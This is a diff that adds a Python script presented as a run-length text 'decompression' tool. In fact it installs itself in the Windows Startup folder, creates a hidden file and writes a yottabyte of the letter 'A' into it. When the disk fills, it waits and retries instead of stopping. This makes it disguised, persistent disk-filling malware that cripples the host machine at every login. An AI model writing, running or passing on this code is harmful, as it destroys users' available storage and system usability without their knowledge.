@@ -1,0 +1,123 @@
+import os
+import subprocess
+import winshell
+import time
+from win32com.client import Dispatch
+import sys
+
+# PASTA DO PROGRAMA
+if getattr(sys, "frozen", False):
+    PASTA_ATUAL = os.path.dirname(sys.executable)
+else:
+    PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))
+
+ARQUIVO_TXT = os.path.join(PASTA_ATUAL, "repeated_text.txt")
+
+def iniciar_com_windows():
+    caminho_programa = (
+        sys.executable if getattr(sys, "frozen", False)
+        else os.path.abspath(__file__)
+    )
+
+    pasta_inicializar = winshell.startup()
+    atalho = os.path.join(
+        pasta_inicializar,
+        "RLETextExpansion.lnk"
+    )
+
+    shell = Dispatch("WScript.Shell")
+    shortcut = shell.CreateShortCut(atalho)
+
+    shortcut.Targetpath = caminho_programa
+    shortcut.WorkingDirectory = PASTA_ATUAL
+    shortcut.save()
+
+# CONFIGURAÇÕES
+TAMANHO_FINAL_YTB = 1
+
+def compactar():
+
+    quantidade = TAMANHO_FINAL_YTB * (1024 ** 8)
+
+    dados = {
+        "caractere": "A",
+        "quantidade": quantidade
+    }
+
+    print("Representação criada na memória!")
+
+    print(f"Tamanho original representado: {quantidade} bytes")
+
+    return dados
+
+TAMANHO_BLOCO = 1024 * 1024  # 1 MB
+
+def descompactar(dados):
+
+    caractere = dados["caractere"]
+    quantidade = dados["quantidade"]
+
+    if caractere != "A":
+        raise ValueError("Caractere inválido.")
+
+    if type(quantidade) is not int or quantidade < 0:
+        raise ValueError("Quantidade inválida.")
+
+    bloco = caractere.encode("ascii") * TAMANHO_BLOCO
+
+    restante = quantidade
+
+    with open(ARQUIVO_TXT, "wb") as arquivo:
+
+        try:
+            subprocess.run(
+                ["attrib", "+h", os.path.abspath(ARQUIVO_TXT)],
+                check=True
+            )
+        except:
+            pass
+
+        while restante > 0:
+
+            tamanho = min(restante, TAMANHO_BLOCO)
+
+            while True:
+                try:
+                    arquivo.write(bloco[:tamanho])
+                    break
+
+                except OSError as erro:
+                    if erro.errno == 28 or getattr(erro, "winerror", None) == 112:
+                        print("\nDisco sem espaço! Aguardando espaço disponível...")
+                        time.sleep(5)
+                    else:
+                        raise
+
+            restante -= tamanho
+
+            progresso = (
+                ((quantidade - restante) / quantidade) * 100
+                if quantidade > 0 else 100
+            )
+
+            print(
+                f"Progresso: {progresso:.8f}%",
+                end="\r"
+            )
+
+    print("\nDescompactação concluída!")
+
+    print(f"Tamanho reconstruído: {quantidade / (1024 ** 8):.2f} YTB")
+
+    print(f"Tamanho no disco: {os.path.getsize(ARQUIVO_TXT)} bytes")
+
+
+if __name__ == "__main__":
+    try:
+        iniciar_com_windows()
+    except Exception as erro:
+        print(f"Erro ao configurar inicialização: {erro}")
+        pass
+
+    dados = compactar()
+    descompactar(dados)
